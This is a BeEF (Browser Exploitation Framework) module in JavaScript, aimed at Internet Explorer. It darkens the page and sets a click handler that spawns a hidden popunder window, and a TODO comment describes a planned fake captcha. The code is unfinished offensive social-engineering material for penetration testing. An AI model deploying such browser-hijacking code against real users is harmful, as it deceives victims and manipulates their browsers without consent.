//
// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	if(beef.browser.isIE()){

       getLanguage = function(){
           var lang = null;
           switch (beef.browser.getBrowserLanguage().substring(0,2)){
               case "en":
                   lang = "en";
                   break;
               case "it":
                   lang = "it";
                   break;
           }
           return lang;
       };

        grayOut = function(vis, options) {
            var options = options || {};
            var zindex = options.zindex || 50;
            var opacity = options.opacity || 70;
            var opaque = (opacity / 100);
            var bgcolor = options.bgcolor || '#000000';
            var dark=document.getElementById('darkenScreenObject');
            if (!dark) {
                var tbody = document.getElementsByTagName("body")[0];
                var tnode = document.createElement('div');
                tnode.style.position='absolute';
                tnode.style.top='0px';
                tnode.style.left='0px';
                tnode.style.overflow='hidden';
                tnode.style.display='none';
                tnode.id='darkenScreenObject';
                tbody.appendChild(tnode);
                dark=document.getElementById('darkenScreenObject');
            }
            if (vis) {
                var pageWidth='100%';
                var pageHeight='100%';
                dark.style.opacity=opaque;
                dark.style.MozOpacity=opaque;
                dark.style.filter='alpha(opacity='+opacity+')';
                dark.style.zIndex=zindex;
                dark.style.backgroundColor=bgcolor;
                dark.style.width= pageWidth;
                dark.style.height= pageHeight;
                dark.style.display='block';
            } else {
                dark.style.display='none';
            }
        };

        spawnPopunder = function(){
            //TODO this will be replaced with a webpage served by BeEF
            var pu = window.open('popunder.html','','top=0, left=0,width=500,height=500');
            pu.blur();
        };

        if(beef.browser.isIE9()){
           // [TAB] + shortcut
            $(document.body).attr('onclick', 'spawnPopunder();');
        }else if(beef.browser.isIE10()){
           // just shortcut
            $(document.body).attr('onclick', 'spawnPopunder();');

            //TODO Using Gray-out, display the fake captcha with the 2 gifs (base64 the gif content and use dataURI inline image)
        }else{
           // unsupported IE version
        }
    }
});
